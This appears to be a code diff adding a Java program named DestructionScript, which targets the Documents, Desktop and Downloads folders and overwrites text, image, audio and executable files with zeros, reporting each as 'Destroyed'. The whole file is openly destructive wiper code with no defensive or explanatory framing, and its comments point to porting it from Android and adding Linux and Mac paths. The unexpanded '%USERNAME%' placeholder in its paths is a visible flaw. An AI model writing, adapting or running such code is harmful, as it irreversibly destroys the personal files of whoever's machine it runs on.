@@ -1,0 +1,47 @@
+import java.io.File;
+import java.io.RandomAccessFile;
+import java.io.IOException;
+import java.util.Arrays;
+
+public class DestructionScript {
+    public static void main(String[] args) {
+        // PC directories to target
+        String[] dirs = {
+            "C:\\Users\\%USERNAME%\\Documents", // Windows Documents
+            "C:\\Users\\%USERNAME%\\Desktop",   // Windows Desktop
+            "C:\\Users\\%USERNAME%\\Downloads"  // Windows Downloads
+            // Add Linux/Mac paths if needed, e.g., "/home/username/Documents"
+        };
+
+        // File types to destroy
+        String[] exts = {".txt", ".jpg", ".mp3", ".exe"}; // changed .apk -> .exe for PC
+
+        for (String dir : dirs) {
+            File folder = new File(dir);
+            if (!folder.exists() || !folder.isDirectory()) continue;
+
+            File[] files = folder.listFiles(f -> {
+                if (!f.isFile()) return false;
+                String name = f.getName();
+                int dot = name.lastIndexOf(".");
+                if (dot == -1) return false;
+                String ext = name.substring(dot);
+                return Arrays.asList(exts).contains(ext);
+            });
+
+            if (files == null) continue;
+
+            for (File f : files) {
+                try (RandomAccessFile raf = new RandomAccessFile(f, "rw")) {
+                    byte[] zeros = new byte[(int) f.length()];
+                    raf.write(zeros);
+                    System.out.println("Destroyed: " + f.getAbsolutePath());
+                } catch (IOException e) {
+                    System.err.println("Failed: " + f.getAbsolutePath());
+                }
+            }
+        }
+
+        System.out.println("DestructionScript finished execution.");
+    }
+}
